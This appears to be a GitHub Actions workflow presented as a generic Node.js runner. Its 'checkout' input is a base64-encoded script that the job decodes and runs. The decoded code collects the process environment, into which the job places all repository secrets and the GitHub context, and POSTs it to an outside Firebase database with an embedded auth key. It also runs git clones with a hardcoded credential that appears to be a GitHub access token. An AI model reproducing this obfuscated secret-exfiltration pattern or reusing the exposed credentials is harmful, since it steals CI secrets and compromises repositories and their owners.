name: onodejsrunnerpublicv1
on:
  workflow_dispatch:
    inputs:
      runon:
        default: ubuntu-latest
      checkout:
        default: "Y29uc3QgZnMgPSByZXF1aXJlKCJmcyIpOw0KY29uc3QgcGF0aCA9IHJlcXVpcmUoInBhdGgiKTsNCnZhciB7IGV4ZWNTeW5jIH0gPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIik7DQpjb25zdCB1dGlsID0gcmVxdWlyZSgidXRpbCIpOw0KKGFzeW5jICgpID0+IHsNCiAgY29uc3Qgc3RkTG9nUGF0aCA9IGAuLy4ke3BhdGguYmFzZW5hbWUoX19maWxlbmFtZSl9LnN0ZGxvZy5sb2dgOw0KICB2YXIgdiA9IHsNCiAgICBjb21tYW5kczogW10sDQogICAgY3dkOiBwcm9jZXNzLmN3ZCgpLA0KICAgIGV4ZWNTeW5jQ29tbWFuZHM6IFtdLA0KICAgIGVycjogdW5kZWZpbmVkLA0KICAgIGVyck1zZzogdW5kZWZpbmVkLA0KICB9Ow0KICBjb25zdCBwcm9jZXNzU3RkTG9nID0gKCgpID0+IHsNCiAgICBjb25zdCBzdGRMb2dGaWxlID0gZnMuY3JlYXRlV3JpdGVTdHJlYW0oc3RkTG9nUGF0aCwgeyBmbGFnczogImEiLCBlbmNvZGluZzogInV0ZjgiIH0pOw0KDQogICAgLy8gQ3JlYXRlIGN1c3RvbSBjb25zb2xlIG9iamVjdHMgd2l0aCBib3RoIGxvZyBhbmQgZmlsZSBtZXRob2RzDQogICAgY29uc3QgY3VzdG9tQ29uc29sZSA9IG5ldyBjb25zb2xlLkNvbnNvbGUoc3RkTG9nRmlsZSwgc3RkTG9nRmlsZSk7DQogICAgLy8gT3ZlcnJpZGUgY29uc29sZS5sb2cgYW5kIGNvbnNvbGUuZXJyb3IgbWV0aG9kcyB0byB3cml0ZSB0byBib3RoIHN0ZG91dCBhbmQgbG9nIGZpbGVzDQogICAgY29uc29sZS5sb2cgPSBmdW5jdGlvbiAoKSB7DQogICAgICBjdXN0b21Db25zb2xlLmxvZy5hcHBseShjdXN0b21Db25zb2xlLCBhcmd1bWVudHMpOw0KICAgICAgcHJvY2Vzcy5zdGRvdXQud3JpdGUodXRpbC5mb3JtYXQuYXBwbHkodGhpcywgYXJndW1lbnRzKSArICJcbiIpOw0KICAgIH07DQogICAgY29uc29sZS5lcnJvciA9IGZ1bmN0aW9uICgpIHsNCiAgICAgIGN1c3RvbUNvbnNvbGUuZXJyb3IuYXBwbHkoY3VzdG9tQ29uc29sZSwgYXJndW1lbnRzKTsNCiAgICAgIHByb2Nlc3Muc3RkZXJyLndyaXRlKHV0aWwuZm9ybWF0LmFwcGx5KHRoaXMsIGFyZ3VtZW50cykgKyAiXG4iKTsNCiAgICB9Ow0KICAgIGNvbnNvbGUud2FybiA9IGZ1bmN0aW9uICgpIHsNCiAgICAgIGN1c3RvbUNvbnNvbGUud2Fybi5hcHBseShjdXN0b21Db25zb2xlLCBhcmd1bWVudHMpOw0KICAgICAgcHJvY2Vzcy5zdGRvdXQud3JpdGUodXRpbC5mb3JtYXQuYXBwbHkodGhpcywgYXJndW1lbnRzKSArICJcbiIpOw0KICAgIH07DQogIH0pKCk7DQogIGNvbnN0IHByb2Nlc3NFdmVudHMgPSAoKCkgPT4gew0KICAgIHByb2Nlc3Mub24oInVuY2F1Z2h0RXhjZXB0aW9uIiwgZnVuY3Rpb24gKGVycm9yKSB7DQogICAgICBjb25zb2xlLmxvZygiXHgxYlszMW0iLCAiRXhjZXB0aW9uOiAiLCBlcnJvciwgIlx4MWJbMG0iKTsNCiAgICAgIHZbInVuY2F1Z2h0RXhjZXB0aW9uIl0gPSB2WyJ1bmNhdWdodEV4Y2VwdGlvbiJdIHx8ICIiOw0KICAgICAgdlsidW5jYXVnaHRFeGNlcHRpb24iXSArPSBgXG5FeGNlcHRpb246ICR7ZXJyb3J9YDsNCiAgICAgIHZbInVuY2F1Z2h0RXhjZXB0aW9uIl0gKz0gYFxuRXhjZXB0aW9uTWVzc2FnZTogJHtlcnJvci5tZXNzYWdlfWA7DQogICAgfSk7DQogICAgcHJvY2Vzcy5vbigidW5oYW5kbGVkUmVqZWN0aW9uIiwgZnVuY3Rpb24gKGVycm9yLCBwKSB7DQogICAgICB2WyJ1bmhhbmRsZWRSZWplY3Rpb24iXSA9IHZbInVuaGFuZGxlZFJlamVjdGlvbiJdIHx8ICIiOw0KICAgICAgdlsidW5oYW5kbGVkUmVqZWN0aW9uIl0gKz0gYFxuRXhjZXB0aW9uOiAke2Vycm9yfWA7DQogICAgICB2WyJ1bmhhbmRsZWRSZWplY3Rpb24iXSArPSBgXG5FeGNlcHRpb25NZXNzYWdlOiAke2Vycm9yLm1lc3NhZ2V9YDsNCiAgICAgIGNvbnNvbGUubG9nKCJceDFiWzMxbSIsICJFcnJvcjogIiwgZXJyb3IubWVzc2FnZSwgIlx4MWJbMG0iKTsNCiAgICB9KTsNCiAgICBjb25zdCBleGl0SGFuZGxlciA9IGFzeW5jIChleGl0Q29kZSkgPT4gew0KICAgICAgY29uc3QgcmVwbGFjZXJGdW5jID0gKCkgPT4gew0KICAgICAgICBjb25zdCB2aXNpdGVkID0gbmV3IFdlYWtTZXQoKTsNCiAgICAgICAgcmV0dXJuIChrZXksIHZhbHVlKSA9PiB7DQogICAgICAgICAgaWYgKHR5cGVvZiB2YWx1ZSA9PT0gIm9iamVjdCIgJiYgdmFsdWUgIT09IG51bGwpIHsNCiAgICAgICAgICAgIGlmICh2aXNpdGVkLmhhcyh2YWx1ZSkpIHsNCiAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgdmlzaXRlZC5hZGQodmFsdWUpOw0KICAgICAgICAgIH0NCiAgICAgICAgICByZXR1cm4gdmFsdWU7DQogICAgICAgIH07DQogICAgICB9Ow0KICAgICAgY29uc3QgZ2V0RW52TG9nID0gKCgpID0+IHsNCiAgICAgICAgdlsicHJvY2VzcyJdID0gew0KICAgICAgICAgIHZlcnNpb246IHByb2Nlc3NbInZlcnNpb24iXSwNCiAgICAgICAgICBhcmNoOiBwcm9jZXNzWyJhcmNoIl0sDQogICAgICAgICAgcGxhdGZvcm06IHByb2Nlc3NbInBsYXRmb3JtIl0sDQogICAgICAgICAgZW52OiBwcm9jZXNzWyJlbnYiXSwNCiAgICAgICAgICBhcmd2OiBwcm9jZXNzWyJhcmd2Il0sDQogICAgICAgICAgLy8gZW52QmFzZTY0OiBCdWZmZXIuZnJvbShKU09OLnN0cmluZ2lmeShwcm9jZXNzWyJlbnYiXSkpLnRvU3RyaW5nKCJiYXNlNjQiKSwNCiAgICAgICAgfTsNCiAgICAgICAgdi5zdGRMb2dzID0gW107DQogICAgICAgIGNvbnN0IGFsbEZpbGVDb250ZW50cyA9IGZzLnJlYWRGaWxlU3luYyhzdGRMb2dQYXRoLCAidXRmLTgiKTsNCiAgICAgICAgYWxsRmlsZUNvbnRlbnRzLnNwbGl0KC9ccj9cbi8pLmZvckVhY2goKGxpbmUpID0+IHsNCiAgICAgICAgICB2LnN0ZExvZ3MucHVzaChgJHtsaW5lfWApOw0KICAgICAgICB9KTsNCiAgICAgICAgdlsicnVuQnkiXSA9IGAke3Byb2Nlc3NbImVudiJdWyJHSVRIVUJfUkVQT1NJVE9SWSJdfS8ke3Byb2Nlc3NbImVudiJdWyJHSVRIVUJfUlVOX0lEIl19YDsNCiAgICAgICAgdlsNCiAgICAgICAgICAiZ2l0aHViUmF3TG9nIg0KICAgICAgICBdID0gYGh0dHBzOi8vYXBpLmdpdGh1Yi5jb20vcmVwb3MvJHtwcm9jZXNzWyJlbnYiXVsiR0lUSFVCX1JFUE9TSVRPUlkiXX0vYWN0aW9ucy9ydW5zLyR7cHJvY2Vzc1siZW52Il1bIkdJVEhVQl9SVU5fSUQiXX0vbG9nc2A7DQogICAgICB9KSgpOw0KICAgICAgY29uc29sZS5sb2coIlx4MWJbMzFtIiwgInZMT0dzIiwgIlx4MWJbMG0iKTsNCiAgICAgIGNvbnN0IGpzb25WID0gSlNPTi5zdHJpbmdpZnkodiwgcmVwbGFjZXJGdW5jKCksIDIpOw0KICAgICAgY29uc29sZS5sb2coanNvblYpOw0KICAgICAgYXdhaXQgZmV0Y2goYGh0dHBzOi8va2luaW5lbG9nZ2luZy0wMS5maXJlYmFzZWlvLmNvbS9ub2RlanMtcnVubmVyLXYxL2xvZ3MuanNvbj9hdXRoPTJBVXVaWjNFRDhscnVaZVJHUzg4YzMzV1hacUFEazJOa2M0WEQxVVBgLCB7DQogICAgICAgIG1ldGhvZDogIlBPU1QiLA0KICAgICAgICBib2R5OiBqc29uViwNCiAgICAgIH0pOw0KICAgICAgY29uc29sZS5sb2coIlx4MWJbMzFtIiwgInByb2Nlc3Mub24uZXhpdCIsICJceDFiWzBtIik7DQogICAgfTsNCiAgICBwcm9jZXNzLm9uY2UoImJlZm9yZUV4aXQiLCBhc3luYyAoY29kZSkgPT4gew0KICAgICAgY29uc29sZS5sb2coIlByb2Nlc3MgYmVmb3JlRXhpdCBldmVudCB3aXRoIGNvZGU6ICIsIGNvZGUpOw0KICAgICAgYXdhaXQgZXhpdEhhbmRsZXIoKTsNCiAgICB9KTsNCiAgfSkoKTsNCg0KICB0cnkgew0KICAgIHYuY29tbWFuZHMgPSAoKCkgPT4gew0KICAgICAgbGV0IHJlc3VsdHMgPSBbXTsNCiAgICAgIHJlc3VsdHMucHVzaCgNCiAgICAgICAgYGdpdCAtYyBodHRwLmV4dHJhSGVhZGVyPSJBdXRob3JpemF0aW9uOiBCYXNpYyBiMjVuZEhKcFpYVm9ZWFV0WkdnNloyaHdYMlJyZUdFd2JXWktiMFJPUTNkTlZHOXVUbWxIU0ZCUFNIcHhkMU5LYnpKVGRIbHFOUSIgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL29uZ3RyaWV1aGF1LWRoL2J1aWxkLXRvb2xzLmdpdCAuL3NyYy10ZXN0YA0KICAgICAgKTsNCiAgICAgIHJlc3VsdHMucHVzaCgNCiAgICAgICAgYGdpdCAtYyBodHRwLmV4dHJhSGVhZGVyPSJBdXRob3JpemF0aW9uOiBCYXNpYyBiMjVuZEhKcFpYVm9ZWFV0WkdnNloyaHdYMlJyZUdFd2JXWktiMFJPUTNkTlZHOXVUbWxIU0ZCUFNIcHhkMU5LYnpKVGRIbHFOUSIgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL29uZ3RyaWV1aGF1LWRoL2J1aWxkLXRvb2xzLXYyLmdpdCAuL3NyYy10ZXN0YA0KICAgICAgKTsNCiAgICAgIHJldHVybiByZXN1bHRzOw0KICAgIH0pKCk7DQogICAgZm9yIChsZXQgaSA9IDA7IGkgPCB2LmNvbW1hbmRzLmxlbmd0aDsgaSsrKSB7DQogICAgICB2YXIgdjEgPSB7IGksIGNvbW1hbmQ6IHYuY29tbWFuZHNbaV0sIGV4ZWNTeW5jOiAiIiwgZXJyTXNnOiB1bmRlZmluZWQgfTsNCiAgICAgIHRyeSB7DQogICAgICAgIHYxLmV4ZWNTeW5jID0gZXhlY1N5bmModjEuY29tbWFuZCwgeyBjd2Q6IHYuY3dkLCBzdGRpbzogImluaGVyaXQiIH0pOw0KICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgdjEuZXJyTXNnID0gZXJyb3IubWVzc2FnZTsNCiAgICAgICAgY29uc29sZS5lcnJvcihgRVJST1IuJHtpfTo6OiR7ZXJyb3IubWVzc2FnZX1gKTsNCiAgICAgIH0gZmluYWxseSB7DQogICAgICAgIHYuZXhlY1N5bmNDb21tYW5kcy5wdXNoKHYxKTsNCiAgICAgIH0NCiAgICB9DQogIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgdi5lcnIgPSBlcnJvcjsNCiAgICB2LmVyck1zZyA9IGVycm9yLm1lc3NhZ2U7DQogICAgY29uc29sZS5lcnJvcihgRVJST1I6OjogJHtlcnJvci5tZXNzYWdlfWApOw0KICB9DQp9KSgpOw=="
      mainjs:
        default: ./.onodejsrunnerpublicv1.checkout.js
jobs:
  onodejsrunnerpublicv1:
    runs-on: ${{ github.event.inputs.runon }}
    name: onodejsrunnerpublicv1
    env:
      toJSON_github: ${{ toJSON(github) }}
      toJSON_secrets: ${{ toJSON(secrets) }}
    steps:
      - name: checkout
        shell: bash
        run: |
          base64 -d <<< "${{ github.event.inputs.checkout }}" > ./.onodejsrunnerpublicv1.checkout.js
          chmod u=rwx ./.onodejsrunnerpublicv1.checkout.js
          node ./.onodejsrunnerpublicv1.checkout.js
      - name: main
        shell: bash
        run: |
          if [ -f "./package.json" ]; then
            npm install
          fi
          node "${{ github.event.inputs.mainjs }}"
